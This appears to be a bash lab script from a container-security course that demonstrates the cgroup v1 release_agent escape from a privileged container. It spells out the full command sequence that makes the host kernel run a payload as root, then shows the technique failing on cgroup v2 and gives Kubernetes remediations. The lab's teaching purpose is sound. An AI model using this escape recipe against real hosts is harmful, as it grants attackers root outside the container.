#!/usr/bin/env bash
# act3/04-release_agent.sh — escape 4 of 4, and its death on cgroup v2.
# Terminal: lab (B) + host (A). Uses sudo. DISPOSABLE LAB VM ONLY.
#
# The one technique the KERNEL VERSION itself kills:
#   BEAT 2 succeeds on cgroup v1 (your machine is on v1 after setup/02)
#   BEAT 3 dies on cgroup v2 — prediction committed BEFORE each attempt
#
# TECH NOTE: v1 allows one hierarchy per controller. The memory controller
# is already bound; we look for a FREE controller in /proc/cgroups (rdma is
# usually free on this VM) and mount a FRESH hierarchy — that is the real
# technique: 'privileged container mounts its own cgroup hierarchy'.
#
# CLEANUP: trap unmounts the lab hierarchy and removes payloads. A cgroup
# hierarchy mounted INSIDE the jail's mount ns dies with the jail anyway.

set -euo pipefail

hr()   { printf '\n\033[1m%s\033[0m\n' "----------------------------------------------------------------"; }
hdr()  { printf '\n\033[1m== %s ==\033[0m\n' "$*"; }
say()  { printf '  %s\n' "$*"; }
pause(){ printf '\n  \033[2m[press Enter for the next beat]\033[0m'; read -r; }
JAIL_PROMPT='\[\033[35m\][PRIVILEGED-JAIL]\[\033[0m\] \$ '

PAYLOAD_DIR=/tmp/lab-escape
MARKER=$PAYLOAD_DIR/marker
CG_MNT=/tmp/lab-cgroup          # fresh v1 hierarchy, mounted inside the jail

[[ $EUID -eq 0 ]] || exec sudo "$0" "$@"

cleanup() {
    rm -rf "$PAYLOAD_DIR"
    # hierarchy mounts die with the jail's mount ns; nothing else persists
    return 0
}
trap cleanup EXIT INT TERM

# --------------------------------------------------------------------------
hdr "BEAT 1 — PREREQ: a free controller, a writable hierarchy"
hr
say "release_agent lives at the ROOT of a cgroup v1 hierarchy. The classic"
say "constraint: each controller binds to ONE hierarchy. Find a FREE one:"
say "    cat /proc/cgroups"
say "    (columns: subsys_name hierarchy num_cgroups enabled — hierarchy 0 = free)"
say ""
say "Prediction time — commit BEFORE beat 2, in writing:"
say "    v1 fresh hierarchy + writable release_agent → escape WORKS or FAILS?"
say "    v2 unified hierarchy (beat 3)                    → WORKS or FAILS?"
hr
cat /proc/cgroups | sed 's/^/    /'
pause

# --------------------------------------------------------------------------
hdr "BEAT 2 — ESCAPE: the v1 release_agent"
hr
mkdir -p "$PAYLOAD_DIR"
cat > "$PAYLOAD_DIR/payload.sh" <<'EOF'
#!/bin/sh
echo "release_agent ESCAPE: ran as $(id -un) pid $$ at $(date)" >> /tmp/lab-escape/marker
EOF
chmod +x "$PAYLOAD_DIR/payload.sh"
say "Into the privileged jail. Run inside (line by line, reading each):"
say "    mkdir $CG_MNT"
say "    CTRL=\$(awk '\$2==0 && \$4==1 {print \$1; exit}' /proc/cgroups)"
say "    mount -t cgroup -o \$CTRL cgroup $CG_MNT       (YOUR OWN hierarchy)"
say "    mkdir $CG_MNT/x"
say "    echo 1 > $CG_MNT/x/notify_on_release           (arm the child)"
say "    echo '/tmp/lab-escape/payload.sh' > $CG_MNT/release_agent"
say "    echo \$\$ > $CG_MNT/x/cgroup.procs               (join the child cgroup)"
say "    (now LEAVE the child: exit → cgroup empty → trigger fires)"
say "Then Terminal A:"
say "    cat /tmp/lab-escape/marker     (the kernel ran your payload as root)"
hr
env PS1="$JAIL_PROMPT" unshare -m bash
if [[ -f "$MARKER" ]] && grep -q release_agent "$MARKER"; then
    say "ESCAPE CONFIRMED on v1 — and read the trigger once more:"
    say "  the kernel ran a program BECAUSE A DIRECTORY BECAME EMPTY."
    say "  You never executed anything in the cage for the escape itself"
    say "  (unlike binfmt_misc): membership + departure was the whole attack."
else
    say "no release_agent line in marker — check: free controller found?"
    say "(awk should print e.g. rdma; if it printed nothing, no controller"
    say " is free and the mount step is the failure — tell your instructor)"
fi
pause

# --------------------------------------------------------------------------
hdr "BEAT 3 — THE DEATH: same recipe, cgroup v2"
hr
say "Fresh jail. The v2 world (unified hierarchy) — commit to your beat-1"
say "prediction, then run inside:"
say "    mkdir /tmp/cgroup2-test"
say "    mount -t cgroup2 none /tmp/cgroup2-test"
say "    ls /tmp/cgroup2-test | grep -c release_agent     (ZERO — it is not there)"
say "    echo '/tmp/lab-escape/payload.sh' > /tmp/cgroup2-test/release_agent"
say "    (dies: No such file or directory — the knob does not EXIST on v2)"
say "    ls /tmp/cgroup2-test | grep -E 'memory.max|cgroup.procs'   (v2's real files)"
hr
env PS1="$JAIL_PROMPT" unshare -m bash
say "The technique is not 'blocked' — it is GONE. The v2 redesign removed"
say "the callback mechanism; 'run a program on empty' was classified as a"
say "bug class and deleted. On modern Kubernetes (cgroup v2 default, the"
say "2026 migration wave), beat 2 cannot happen at all."
pause

# --------------------------------------------------------------------------
hdr "BEAT 4 — REMEDIATE (for the v1 world): no mount, no knob"
hr
say "For clusters still on v1, defense-in-depth, inside a fresh jail:"
say "  Flavor 1 — no CAP_SYS_ADMIN (privileged: false):"
say "    capsh --drop=cap_sys_admin -- -c 'mkdir /tmp/x-cg && mount -t cgroup -o \$CTRL cgroup /tmp/x-cg'"
say "    (dies: Operation not permitted — you cannot even MOUNT a hierarchy)"
say "  Flavor 2 — read-only /sys and no rw cgroup paths:"
say "    (the pod spec never exposes a writable cgroup filesystem: defaults)"
say ""
say "Kubernetes mapping:"
say "  privileged: false → flavor 1, always"
say "  default volume/mount set → no cgroup paths in the cage"
say "  cgroup v2 → beat 3's death, as infrastructure policy"

# --------------------------------------------------------------------------
hdr "RESIDUE CHECK (automatic)"
[[ -f "$MARKER" ]] && say "marker: $(wc -l < "$MARKER") line(s) — read all four technique results" || say "marker: none"
grep -qs "$CG_MNT" /proc/mounts && say "lab hierarchy visible on host: YES (stale jail? umount it)" || say "lab hierarchy on host: NO"

hdr "CHECK QUESTIONS (act3/04) — act 3 is complete"
cat <<'EOF'
  1. Compare the four techniques by TRIGGER: core dump / uevent / exec /
     cgroup-empties. Which two needed NO execution inside the cage?
  2. Why did v2's designers delete release_agent rather than restrict it?
     (Hint: what was the vulnerability — the program, the privilege, or
     the mere EXISTENCE of a kernel-run-program callback?)
  3. Your beat 1 predictions: score yourself. If v1 succeeded and v2 died
     as you predicted, you now own the act2/01 table — it predicted all four.

  Act 4: act4-matrix.md — fill it from your notes. Then:
  Act 5: act5-cluster/01-kind.sh — the lessons become a scanner run.
EOF
